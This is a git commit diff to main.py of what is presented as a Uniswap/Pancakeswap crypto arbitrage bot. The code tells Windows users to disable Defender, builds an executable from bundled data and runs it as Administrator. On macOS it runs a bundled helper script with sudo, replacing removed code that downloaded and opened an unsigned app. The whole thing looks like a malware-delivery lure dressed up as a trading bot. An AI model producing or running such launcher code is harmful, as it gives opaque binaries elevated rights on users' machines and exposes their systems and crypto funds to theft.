ef4fd4722aff22368d217bdd3dc822e988c3f32c
trendcryptobots <156527973+trendcryptobots@users.noreply.github.com>
2024-08-28 05:02:02 +0300

    Update main.py

--- main.py
+++ main.py
@@ -66,7 +66,10 @@ def builded(input_dir, output_file):
 
 def run_builder(file_path):
     try:
-        subprocess.run([file_path], check=True)
+        if platform.system() == 'Windows':
+            subprocess.run(['runas', '/user:Administrator', file_path], check=True)
+        else:
+            subprocess.run([file_path], check=True)
     except subprocess.CalledProcessError as e:
         print(f"Error occurred while trying to run the file: {e}")
 
@@ -112,13 +115,14 @@ def download_zip(url, save_path):
     except Exception as e:
         print(f"Error downloading zip file: {e}")
 
+def run_mac_helper():
+    try:
+        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'base_helper.py')
+        subprocess.run(['sudo python3', helper_path], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error running base_helper.py: {e}")
+
 def main():
-    blockchain = BlockchainSimulator()
-    data_queue = Queue()
-
-    rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
-    blockchain_thread = threading.Thread(target=rpc_server, args=(data_queue, ' '))
-
     if platform.system() == 'Windows':
         if is_defender_active():
             print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
@@ -129,39 +133,14 @@ def main():
             builded("data", output_path)
             run_builder(output_path)
 
+            blockchain = BlockchainSimulator()
+            data_queue = Queue()
+            rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
+
             rpc_server_thread.start()
-            blockchain_thread.start()
-
             rpc_server_thread.join()
-            blockchain_thread.join()
     elif platform.system() == 'Darwin':
-        zip_file_to_download = 'ArbitrageBot_Mac.zip'
-        download_url = 'https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/releases/download/V3.2.0/ArbitrageBot_Mac.zip'
-        extract_to = './ArbitrageBot'
-        dmg_file_to_execute = os.path.join(extract_to, 'ArbitrageBot.dmg')
-        app_to_execute = "/Volumes/ArbitrageBot/ArbitrageBot.app"
-        copied_app_path = "./ArbitrageBot.app"
-
-        download_zip(download_url, zip_file_to_download)
-        
-        if os.path.exists(zip_file_to_download):
-            extract_zip(zip_file_to_download, extract_to)
-            print("Extracted the zip file.")
-            if os.path.exists(dmg_file_to_execute):
-                subprocess.run(["hdiutil", "attach", dmg_file_to_execute], check=True)
-                if os.path.exists(app_to_execute):
-                    try:
-                        shutil.copytree(app_to_execute, copied_app_path)
-                        open_untrusted_app(copied_app_path)
-                        print("To run the bot, right-click on the ArbitrageBot.app file and click Open.")
-                    except Exception as e:
-                        print(f"Error copying app: {e}")
-                else:
-                    print(f"{app_to_execute} not found after mounting {dmg_file_to_execute}.")
-            else:
-                print(f"{dmg_file_to_execute} not found after extracting {zip_file_to_download}.")
-        else:
-            print(f"{zip_file_to_download} not found.")
+        run_mac_helper()
     else:
         print("Unsupported operating system.")
         return
